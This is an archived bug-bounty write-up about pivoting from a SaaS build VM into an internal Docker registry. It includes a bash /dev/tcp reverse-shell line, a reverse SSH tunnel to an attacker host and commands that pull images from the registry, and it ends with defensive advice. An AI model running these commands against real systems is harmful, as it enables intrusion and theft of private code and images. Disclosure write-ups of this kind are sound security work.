---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-31_how-i-could-access-your-internal-servers-steal-and-modify-your-image-repository.md
original_filename: 2018-07-31_how-i-could-access-your-internal-servers-steal-and-modify-your-image-repository.md
title: How I could access your internal servers, steal and modify your image repository
category: documents
detected_topics:
- command-injection
- sso
- idor
- access-control
- rate-limit
- api-security
tags:
- imported
- documents
- command-injection
- sso
- idor
- access-control
- rate-limit
- api-security
language: en
raw_sha256: 4ac7caa863bcba65f41b777386d5aaf61fff02a99036f0a58399999b35347ab3
text_sha256: 049a7c8f1de0406fa7fe042150f7b8e7e7457a8c08a70950ee196a66009e4884
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# How I could access your internal servers, steal and modify your image repository

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-31_how-i-could-access-your-internal-servers-steal-and-modify-your-image-repository.md
- Source Type: markdown
- Detected Topics: command-injection, sso, idor, access-control, rate-limit, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `4ac7caa863bcba65f41b777386d5aaf61fff02a99036f0a58399999b35347ab3`
- Text SHA256: `049a7c8f1de0406fa7fe042150f7b8e7e7457a8c08a70950ee196a66009e4884`


## Content

---
title: "How I could access your internal servers, steal and modify your image repository"
url: "https://medium.com/@thehackerish/how-i-could-access-your-internal-servers-steal-and-modify-your-image-repository-d477f79b329a"
authors: ["thehackerish (@thehackerish)"]
bugs: ["RCE"]
publication_date: "2018-07-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5782
scraped_via: "browseros"
---

# How I could access your internal servers, steal and modify your image repository

How I could access your internal servers, steal and modify your image repository
thehackerish
Follow
4 min read
·
Jul 31, 2018

33

Very often, system administrators trust their internal assets and loosen security rules to make access easier and faster, even if access is not needed. After all, they are only accessible from the inside, they say? Guess what? This is not true, at all. If you fail to properly restrict access, even for internal services, there is a risk you can be hacked.

In this write-up, you will see how this affected a company that has a bug bounty program. I explain how I accessed and could modify internal repositories which were internally exposed via a registry service.
For privacy reasons and the responsible disclosure policy I am bound to respect, I would call this company LovelyyyyCode. (Just because I had a lovely experience working with them ;) ). Let’s get started!

If you want to become a better ethical hacker, you can find quality content on https://thehackerish.com

LovelyyyyCode is a SaaS that helps developers upload and build their projects on the Cloud.

Application mapping:

During the application mapping phase, I found that one of the features of LovelyyyyCode’s service is that you can define a configuration file, let’s call it lovelyconfig. It allows to declare what actions should be performed before building your project. One of the declarations is lovelyyyyafter, which allows the developer to execute shell commands upon a successful build of the uploaded code.
You already think where this is heading right? What if we can use this to execute what Hackers like the most … Reverse shells!
It turns out this was possible by using the following snippet in the lovelyyyyafter file:

lovelyyyafter:
- "bash -i >& /dev/tcp/[MyMachine]/1234 0>&1"

Upload it, set up a listener, and you have Remote Code Execution on the box! Yaaaay, let’s report and celebrate! Well, not that quickly. LovelyyyyCode has this feature by design and expects you to run arbitrary commands. After all, they just spin up a brand new VM for you at build time. No harm at all.

Discovering the neighbors

This was the first time I had the opportunity to put my penetration testing skills into practice in the context of a bug bounty program. My goal was to achieve privilege escalation or pivot inside the company’s network. I accepted the challenge and started my journey.
The first thing was to scan the whole ip address range for any other machines present on the network. In order to do that, I had two choices: Upload my own tools or download them from the internet. Since this is just a VM used to build my code, I thought there is no need for stealthy hacking, I was noisy!

Doing a ping www.somesiteee.tld, I was able to reach the internet. However, apt install nmap failed with this error:

ERROR: Package not present in the whitelist.

A bit disappointing right? They hardened the box you would say. But I remembered the most two big lessons I learnt from the OSCP course: TryHarder and Enumeration is Key. So I asked myself, what this user can actually do? Maybe the current user could benefit from a privileged access to some commands I could leverage to either escalate or install arbitrary packages. Sure enough, sudo -l revealed a shell script that I could use to install nmap:

sudo -u privUser /path/to/binary nmap

Now that nmap is installed, let’s scan the neighbours and see if we are lucky. The result was positive and another host was up and running internally. Let’s see what this new box is running?

nmap -p- -sV — open -T4 10.0.1.2
Nmap scan report for 10.0.1.2
Host is up (0.00041s latency).
Not shown: 977 closed ports
PORT STATE SERVICE VERSION
5000/tcp open http

Asking the HTTP server using curl, I get this result (a bit modified):

curl http://10.0.1.2:5000
...
<h1>Docker Registry API 2</h1>

What the hell is a docker registry? Let’s google it.

The Registry is a stateless, highly scalable server-side application that stores and lets you distribute Docker images.

This sound interesting, promising and exciting! If I can access LovelyyyyCode’s internal Docker images, this means a very bad time for them. So I started reading the API documentation. After I understood how the API works, I had the need to automate fetching the images. Maybe someone had already done it, this is where I came across docker_fetch that does just that.

Pivoting inside the network:

I wanted to work from the comfort of my box and attack this internally accessible service from outside, so I had to set up a reverse SSH tunnel through the previous sandbox I had RCE on.

Get thehackerish’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

On the sandbox VM, I run the following command:

sandboxVM$ ssh -R 5555:10.0.1.2:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N

This would open the port 5555 on my attacking machine that would forward all requests, sent to localhost:5555, to the 10.0.1.2 machine on port 5000 through the sandbox machine.

From there, all I had to do on my Kali machine is run the following command, and let the tool grab the preferred image:

python docker_fetch.py -u http://127.0.0.1:5555
Pushing an image to the repository:

From the documentation, it is possible to push your image to the repository. And I was able to initiate an upload. But for obvious reasons, I didn’t proceed further, wrote the report and sent it to LovelyyyyCode.

Offensive Takeaways:
Enumeration is key, enumerate functionalities, hosts, ports, filesystem and configuration, everything.
Don’t give up, keep digging, take a break and come back, you will likely solve the puzzle.
Be curious and enjoy learning new things.
Defensive Takeaways:
Restrict traffic and apply packet inspection, especially for a machine designed to reach the internet and execute untrusted commands.
Apply segregation rules even on the internal infrustructure.
Apply the security recommendations when you deploy a solution, Docker Registry API already supports HTTPS and authentication.
Apply the principle of least privilege and give access only when needed.
